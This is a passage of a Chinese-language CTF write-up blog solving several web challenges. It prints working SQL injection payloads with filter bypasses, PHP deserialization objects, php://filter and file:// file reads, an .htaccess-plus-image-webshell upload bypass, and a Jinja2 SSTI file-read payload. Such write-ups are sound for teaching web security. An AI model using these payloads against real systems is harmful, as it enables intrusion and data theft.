</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>?</span><span class=n>username</span><span class=o>=</span><span class=k>admin</span><span class=o>%</span><span class=mi>27</span><span class=k>or</span><span class=p>(</span><span class=n>extractvalue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=p>(</span><span class=n>group_concat</span><span class=p>(</span><span class=k>column_name</span><span class=p>))</span><span class=k>from</span><span class=p>(</span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=p>)</span><span class=k>where</span><span class=p>(</span><span class=k>table_name</span><span class=p>)</span><span class=k>like</span><span class=p>(</span><span class=s1>&#39;H4rDsq1&#39;</span><span class=p>)),</span><span class=mi>0</span><span class=n>x7e</span><span class=p>)))</span><span class=o>%</span><span class=mi>23</span><span class=o>&amp;</span><span class=n>password</span><span class=o>=</span><span class=mi>1</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>å½“å‰è¡¨çš„å­—æ®µæœ‰ï¼šid,username,password</p><ol><li>å‡ºæ•°æ®</li></ol><p>å¦‚æœä½¿ç”¨æ­£å¸¸çš„æŸ¥è¯¢è¯­å¥ä¼šå› ä¸ºflagçš„é•¿åº¦å¤ªé•¿ï¼Œé¡µé¢ä¸­çš„å›æ˜¾é•¿åº¦ä¸èƒ½æ˜¾ç¤ºå…¨ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨<code>left</code>å’Œ<code>right</code>å‡½æ•°ï¼š</p><blockquote><p>è¯­æ³•ï¼šLEFT(ARG,LENGTH)ã€RIGHT(ARG,LENGTH)</p></blockquote><p>è¿™ä¸¤ä¸ªå‡½æ•°ä¼šç”¨åˆ°é€‰å–çš„é•¿åº¦ï¼Œå¦‚æœæƒ³è¦æ‹¼æˆä¸€ä¸ªå®Œæ•´çš„flagï¼Œå¯ä»¥å…ˆç”¨lengthæŸ¥çœ‹æ€»é•¿åº¦ï¼Œè®¡ç®—ä»¥åæ‹¼ä¸€ä¸‹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>?</span><span class=n>username</span><span class=o>=</span><span class=k>admin</span><span class=o>%</span><span class=mi>27</span><span class=k>or</span><span class=p>(</span><span class=n>extractvalue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=p>(</span><span class=k>left</span><span class=p>(</span><span class=n>password</span><span class=p>,</span><span class=mi>35</span><span class=p>))</span><span class=k>from</span><span class=p>(</span><span class=n>H4rDsq1</span><span class=p>)),</span><span class=mi>0</span><span class=n>x7e</span><span class=p>)))</span><span class=o>%</span><span class=mi>23</span><span class=o>&amp;</span><span class=n>password</span><span class=o>=</span><span class=mi>1</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>flag{112bb5db-17a4-47e2-97b4-19</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>?</span><span class=n>username</span><span class=o>=</span><span class=k>admin</span><span class=o>%</span><span class=mi>27</span><span class=k>or</span><span class=p>(</span><span class=n>extractvalue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=p>(</span><span class=k>right</span><span class=p>(</span><span class=n>password</span><span class=p>,</span><span class=mi>11</span><span class=p>))</span><span class=k>from</span><span class=p>(</span><span class=n>H4rDsq1</span><span class=p>)),</span><span class=mi>0</span><span class=n>x7e</span><span class=p>)))</span><span class=o>%</span><span class=mi>23</span><span class=o>&amp;</span><span class=n>password</span><span class=o>=</span><span class=mi>1</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>dc295a017f}</p><hr><h1 id=ç½‘é¼æ¯-2018fakebook>[ç½‘é¼æ¯ 2018]Fakebook</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210307174819.png loading=lazy></p><p>æ˜¯ä¸€ä¸ªå±•ç¤ºè‡ªå·±åšå®¢ç½‘å€çš„åˆ—è¡¨ï¼Œå…ˆéšä¾¿æ³¨å†Œä¸€ä¸ª</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210307175313.png loading=lazy></p><p>æˆ‘å¡«çš„æ˜¯baiduçš„ç½‘å€23333ã€‚è¿™æ—¶çš„urlæ˜¯ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://2cefe2a5-4e68-44ce-870c-3628c2500cd3.node3.buuoj.cn/view.php?no=1
</span></span></code></pre></td></tr></table></div></div><p>çœ‹åˆ°äº†no=1ï¼Œåº”è¯¥æƒ³åˆ°äº†sqlæ³¨å…¥ï¼Œæˆ‘æ²¡æœ‰è¯•å‡ºä»€ä¹ˆåå ‚ï¼Œä½†æ˜¯åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†ä¸€ä¸ªè¿™é“é¢˜çš„éé¢„æœŸè§£ï¼š[<a class=link href=https://www.cnblogs.com/kevinbruce656/p/12643338.html target=_blank rel=noopener>ç½‘é¼æ¯2018]fakebooké¢˜è§£</a>ï¼Œä½¿ç”¨äº†<code>load_file</code>å‡½æ•°ç›´æ¥è¯»å–äº†flagæ–‡ä»¶ã€‚åŒæ ·æ˜¯ç©ºæ ¼è¢«è¿‡æ»¤ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨<code>/**/</code>ç»•è¿‡ã€‚</p><h2 id=éé¢„æœŸè§£>éé¢„æœŸè§£</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?no=-1 union/**/select 1,2,3,4
</span></span></code></pre></td></tr></table></div></div><p>å…ˆä½¿ç”¨ä¸Šé¢çš„è¯­å¥æŸ¥çœ‹å›æ˜¾ç‚¹ã€‚</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210307180356.png loading=lazy></p><p>æ‰¾çš„äº†ä½ç½®2çš„å›æ˜¾ç‚¹ï¼Œå¯ä»¥æŠŠå‡½æ•°æ›¿æ¢åœ¨2çš„ä½ç½®ä¸Šã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=err>?</span><span class=n>no</span><span class=o>=-</span><span class=mi>1</span> <span class=n>union</span><span class=o>/**/</span><span class=n>select</span> <span class=mi>1</span><span class=p>,</span><span class=n>load_file</span><span class=p>(</span><span class=s1>&#39;/var/www/html/flag.php&#39;</span><span class=p>),</span><span class=mi>3</span><span class=p>,</span><span class=mi>4</span>
</span></span></code></pre></td></tr></table></div></div><p>å‚è€ƒå¸ˆå‚…çš„åšå®¢ä¸­æ˜¯ä½¿ç”¨äº†ç›²æ³¨è·å¾—flagçš„ï¼Œå…¶å®æ‰§è¡Œä»¥åä½¿ç”¨é¡µé¢çš„é€‰å–å·¥å…·é€‰å–å›æ˜¾çš„æ ‡ç­¾å—ï¼Œå¯ä»¥åœ¨æ³¨é‡Šé‡Œæ‰¾çš„åˆ°ğŸ¤£</p><h2 id=é¢„æœŸè§£>é¢„æœŸè§£</h2><p>æ­£å¸¸çš„sqlæ³¨å…¥ä¸€å¥—æŸ¥è¯¢ï¼ŒåŒæ ·æ˜¯ä½¿ç”¨<code>/**/</code>ç»•è¿‡ç©ºæ ¼è¿‡æ»¤ã€‚</p><p>çˆ†è¡¨</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?no=-1%20union/***/select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=database()%23
</span></span></code></pre></td></tr></table></div></div><p>çˆ†å­—æ®µ</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?no=-1 union/***/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39; %23
</span></span></code></pre></td></tr></table></div></div><p>å‡ºæ•°æ®</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?no=-1 union/***/select 1,group_concat(no,username,passwd,data),3,4 from users
</span></span></code></pre></td></tr></table></div></div><p>æŸ¥è¯¢çš„ç»“æœæ˜¯ä¸€å¤§ä¸²å­—ç¬¦ä¸²ï¼Œä½†æ˜¯åœ¨ç»“å°¾ä¸€ä¸ªPHPçš„åºåˆ—åŒ–å¯¹è±¡ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:7:&#34;guobang&#34;;s:3:&#34;age&#34;;i:18;s:4:&#34;blog&#34;;s:20:&#34;http://www.baidu.com&#34;;}
</span></span></code></pre></td></tr></table></div></div><p>è¯´æ˜ç½‘ç«™æ˜¯ä½¿ç”¨ååºåˆ—åŒ–è·å–å¯¹åº”æ çš„æ•°æ®ï¼Œä¸‹é¢æœ‰ä¸€ä¸ªiframeçš„æ ‡ç­¾ï¼Œæ ¹æ®æç¤º<strong>the contents of his/her blog</strong>ï¼Œå¾—çŸ¥æˆ‘ä»¬æä¾›çš„ç½‘å€ä¼šåœ¨è¿™é‡Œæ˜¾ç¤ºï¼Œæ­£å¥½æœ‰ä¸€ä¸ªphpä¼ªåè®®file://å¯ä»¥è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œæ€è·¯å°±æ˜¯ï¼š<strong>ä½¿ç”¨ä¼ªåè®®è¯»å–flagä½œä¸ºblogç½‘ç«™å›æ˜¾åœ¨iframeçš„æ ‡ç­¾ä¸­</strong>ï¼Œæ‰€ä»¥æ„é€ ä¸€ä¸ªåºåˆ—åŒ–å¯¹è±¡ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>UserInfo</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span> <span class=o>=</span> <span class=s2>&#34;guobang&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$age</span> <span class=o>=</span> <span class=mi>18</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$blog</span> <span class=o>=</span> <span class=s2>&#34;file:///var/www/html/flag.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$s</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>UserInfo</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>//O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:7:&#34;guobang&#34;;s:3:&#34;age&#34;;i:18;s:4:&#34;blog&#34;;s:29:&#34;file:///var/www/html/flag.php&#34;;}
</span></span></span></code></pre></td></tr></table></div></div><p>æœ€ç»ˆpayload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=err>?</span><span class=n>no</span><span class=o>=-</span><span class=mi>1</span><span class=o>%</span><span class=mi>20</span><span class=n>union</span><span class=o>/***/</span><span class=n>select</span><span class=o>%</span><span class=mi>201</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=s1>&#39;O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:7:&#34;guobang&#34;;s:3:&#34;age&#34;;i:18;s:4:&#34;blog&#34;;s:29:&#34;file:///var/www/html/flag.php&#34;;}&#39;</span> <span class=n>from</span><span class=o>%</span><span class=mi>20</span><span class=n>users</span>
</span></span></code></pre></td></tr></table></div></div><p>åœ¨iframeé‡Œé¢æ‰¾ï¼Œæ˜¯ä¸€ä¸ªdata:text/htmlçš„æ•°æ®æ ¼å¼ï¼Œbase64åŠ å¯†çš„å™¢ã€‚</p><hr><h1 id=ç½‘é¼æ¯-2020-é’é¾™ç»„areuserialz>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h1><p>éƒ¨åˆ†å›¾</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308102316.png loading=lazy></p><p>æœ€ä¸‹é¢æœ‰å¯¹äºpayloadçš„é™åˆ¶ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>is_valid</span><span class=p>(</span><span class=nv>$s</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$s</span><span class=p>);</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=nx>ord</span><span class=p>(</span><span class=nv>$s</span><span class=p>[</span><span class=nv>$i</span><span class=p>])</span> <span class=o>&gt;=</span> <span class=mi>32</span> <span class=o>&amp;&amp;</span> <span class=nx>ord</span><span class=p>(</span><span class=nv>$s</span><span class=p>[</span><span class=nv>$i</span><span class=p>])</span> <span class=o>&lt;=</span> <span class=mi>125</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>{</span><span class=s1>&#39;str&#39;</span><span class=p>}))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$str</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;str&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>is_valid</span><span class=p>(</span><span class=nv>$str</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$obj</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$str</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>éœ€è¦payloadä¸­çš„å­—ç¬¦asciiç å€¼<code>å¤§äº</code>32<code>å°äº</code>125ã€‚æ³¨æ„åˆ°æœ€åæœ‰ä¸€ä¸ª<code>unserialize</code>å‡½æ•°ï¼Œåˆ¤æ–­è¿™é“é¢˜è€ƒç‚¹æ˜¯ååºåˆ—åŒ–ã€‚æ¥ä¸‹æ¥åˆ†ææºç ï¼š</p><ul><li><code>process()</code>å‡½æ•°åˆ¤æ–­opçš„å€¼ï¼Œå¦‚æœæ˜¯<code>1</code>å°±å†™å…¥æ–‡ä»¶ï¼Œå¦‚æœæ˜¯<code>2</code>å°±è¯»å–æ–‡ä»¶ã€‚ä»£ç å¼€å¤´åŒ…å«äº†<code>flag.php</code>æ–‡ä»¶ï¼Œæ‰€ä»¥æ¨æµ‹éœ€è¦ä½¿ç”¨2æ“ä½œæ•°è¯»å–flag.phpæ–‡ä»¶ã€‚</li><li><code>write()</code>æŠŠå¯¹è±¡ä¸­çš„<code>$content</code>å±æ€§å€¼å†™å…¥åˆ°<code>$filename</code>æ–‡ä»¶ä¸­ï¼Œå¦‚æœé•¿åº¦å¤§äº100ä¼šè¢«æ‹¦ä¸‹ã€‚</li><li><code>read()</code>ä½¿ç”¨**file_get_contents()**å‡½æ•°è¯»å–æ–‡ä»¶ã€‚<strong>æ­£æ˜¯æˆ‘ä»¬æƒ³è¦çš„</strong>ã€‚</li><li><code>output()</code>è¾“å‡ºå†…å®¹ã€‚</li><li><code>__destruct()</code>å¯¹è±¡é”€æ¯æ—¶ä¼šæ‰§è¡Œçš„å‡½æ•°ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯<strong>if</strong>åˆ¤æ–­é‡Œçš„<code>$this->op === "2"</code>æ˜¯å¼ºæ¯”è¾ƒï¼Œå¹¶ä¸”ä¼šä¿®æ”¹opçš„å€¼ä¸º1ï¼ˆå†™æ–‡ä»¶ï¼‰ï¼Œå› ä¸º**&ldquo;2&rdquo;<strong>æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„å¦‚æœä¼ å…¥</strong>æ•´å‹çš„2**å³å¯ç»•è¿‡ã€‚</li></ul><p>æ‰€ä»¥æˆ‘ä»¬æ„é€ ä¸€ä¸ªå¯¹è±¡<strong>op</strong>ä¸º2ï¼Œ<strong>filename</strong>ä¸ºflag.phpå³å¯ï¼Œè¯»æ–‡ä»¶çš„æ—¶å€™è‚¯å®šä¸æ˜¯</p><p>æ¥ä¸‹æ¥æ˜¯ååºåˆ—åŒ–æ—¶ä¼šé‡åˆ°çš„é—®é¢˜ï¼Œå› ä¸ºå¯¹è±¡ä¸­å±æ€§çš„ä¿®é¥°æ˜¯<code>protected</code>ï¼Œåºåˆ—åŒ–æ—¶éœ€è¦ä¿è¯ä¸€è‡´çš„ã€‚</p><p>å…ˆç»™å‡ºè‡ªå·±åˆ›å»ºçš„å¯¹è±¡æºç </p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>FileHandler</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>protected</span>  <span class=nv>$op</span><span class=o>=</span><span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>protected</span>  <span class=nv>$filename</span><span class=o>=</span><span class=s2>&#34;/var/www/html/flag.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>protected</span>  <span class=nv>$content</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$c</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>FileHandler</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$c</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><ol><li>PHP7.1ä»¥ä¸Šç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿã€ç”¨publicç»•è¿‡:</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>O</span><span class=p>:</span><span class=mi>11</span><span class=p>:</span><span class=s2>&#34;FileHandler&#34;</span><span class=p>:</span><span class=mi>3</span><span class=p>:{</span><span class=n>s</span><span class=p>:</span><span class=mi>2</span><span class=p>:</span><span class=s2>&#34;op&#34;</span><span class=p>;</span><span class=n>i</span><span class=p>:</span><span class=mi>2</span><span class=p>;</span><span class=n>s</span><span class=p>:</span><span class=mi>8</span><span class=p>:</span><span class=s2>&#34;filename&#34;</span><span class=p>;</span><span class=n>s</span><span class=p>:</span><span class=mi>22</span><span class=p>:</span><span class=s2>&#34;/var/www/html/flag.php&#34;</span><span class=p>;</span><span class=n>s</span><span class=p>:</span><span class=mi>7</span><span class=p>:</span><span class=s2>&#34;content&#34;</span><span class=p>;</span><span class=n>N</span><span class=p>;}</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿è¡Œä»¥åå¯ä»¥åœ¨ç½‘é¡µæ³¨é‡Šä¸­æ‰¾åˆ°æ–‡ä»¶ã€‚ç»å¯¹è·¯å¾„è¯»å–ä¹Ÿå¯ä»¥ï¼Œæˆ‘ç¬¬ä¸€æ¬¡ä½¿ç”¨php://filterè¯»å†å»è§£ç ä¹ŸæˆåŠŸäº†ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>O:11:&#34;FileHandler&#34;:3:{s:2:&#34;op&#34;;i:2;s:8:&#34;filename&#34;;s:52:&#34;php://filter/convert.base64-encode/resource=flag.php&#34;;s:7:&#34;content&#34;;N;}
</span></span></code></pre></td></tr></table></div></div><ol start=2><li>åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­sæ›¿æ¢ä¸ºSï¼Œæ”¯æŒå­—ç¬¦ä¸²ç”¨16è¿›åˆ¶ï¼Œ</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>O</span><span class=p>:</span><span class=mi>11</span><span class=p>:</span><span class=s2>&#34;FileHandler&#34;</span><span class=p>:</span><span class=mi>3</span><span class=p>:{</span><span class=n>S</span><span class=p>:</span><span class=mi>5</span><span class=p>:</span><span class=s2>&#34;</span><span class=se>\00</span><span class=s2>*</span><span class=se>\00</span><span class=s2>op&#34;</span><span class=p>;</span><span class=n>i</span><span class=p>:</span><span class=mi>2</span><span class=p>;</span><span class=n>S</span><span class=p>:</span><span class=mi>11</span><span class=p>:</span><span class=s2>&#34;</span><span class=se>\00</span><span class=s2>*</span><span class=se>\00</span><span class=s2>filename&#34;</span><span class=p>;</span><span class=n>S</span><span class=p>:</span><span class=mi>22</span><span class=p>:</span><span class=s2>&#34;/var/www/html/flag.php&#34;</span><span class=p>;</span><span class=n>S</span><span class=p>:</span><span class=mi>10</span><span class=p>:</span><span class=s2>&#34;</span><span class=se>\00</span><span class=s2>*</span><span class=se>\00</span><span class=s2>content&#34;</span><span class=p>;</span><span class=n>N</span><span class=p>;}</span>
</span></span></code></pre></td></tr></table></div></div><p>æ€è·¯ï¼šhttps://blog.csdn.net/Oavinci/article/details/106998738</p><hr><h1 id=mrctf2020ä½ ä¼ ä½ å‘¢>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308104930.png loading=lazy></p><p>æµ‹è¯•åç¼€ï¼Œphpã€phtmléƒ½è¢«è¿‡æ»¤äº†ï¼Œhtaccesså¯ä»¥ï¼Œå…ˆä¼ ä¸Šç‰¹ä¾›çš„<code>.htaccess</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>SetHandler application/x-httpd-php
</span></span></code></pre></td></tr></table></div></div><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308105247.png loading=lazy></p><p>ä¼ å›¾ç‰‡é©¬ï¼Œæˆ‘ä¸€ç›´ç”¨çš„æ˜¯GIFé©¬ï¼Œå‡ æ¬¡å°è¯•éƒ½æ²¡é€šè¿‡ï¼Œåæ¥ä¿®æ”¹äº†<code>Content-Type: image/jpeg</code>å¯ä»¥äº†ï¼Œè¯´æ˜Content-Typeæ˜¯GIFè¿˜ä¸è¡Œï¼Œæ¥ä¸‹æ¥ç›´æ¥ä¼ å›¾ç‰‡ç </p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308105652.png loading=lazy></p><p>æ ¹æ®åœ°å€è®¿é—®å›¾ç‰‡é©¬çš„åœ°å€ï¼Œä½¿ç”¨systemè¯»æ–‡ä»¶è¿˜æ²¡æˆï¼Œç”¨èšå‰‘è¿äº†æ‰§è¡Œæ‰§è¡Œret=127,disable_functionäº†</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308110126.png loading=lazy></p><p>ä¸è¿‡æ ¹ç›®å½•ä¸‹çš„flagæ–‡ä»¶è¿˜æ˜¯å¯ä»¥æ­£å¸¸è¯»å–ï¼Œè‡³äºdisable_functionå¯ä»¥å‚è€ƒ<a class=link href=https://braindance.tk/2020/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/ target=_blank rel=noopener>ã€æå®¢å¤§æŒ‘æˆ˜ 2019ã€‘RCE ME</a>ã€‚</p><hr><h1 id=bjdctf-2ndfake-google>[BJDCTF 2nd]fake google</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308110510.png loading=lazy></p><p>å°±ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œéšä¾¿è¾“å…¥ä¸€ä¸ªå»çœ‹çœ‹ï¼Œè·³è½¬ä»¥å</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308110545.png loading=lazy></p><p>æ³¨é‡Šé‡Œæœ‰æç¤ºsstiï¼Œåº”è¯¥æ˜¯æ¨¡æ¿æ³¨å…¥ï¼Œå°±åœ¨ç½‘ä¸Šæœä¸€ä¸ªsstiçš„payloadè¯•è¯•<a class=link href=https://blog.csdn.net/qq_40657585/article/details/83657220 target=_blank rel=noopener>SSTI (æœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥)</a></p><p>æ‰¾åˆ°äº†ä¸€ä¸ªç›´æ¥è¯»æ–‡ä»¶çš„payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?name={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/flag&#39;, &#39;r&#39;).read() }}{% endif %}{% endfor %}
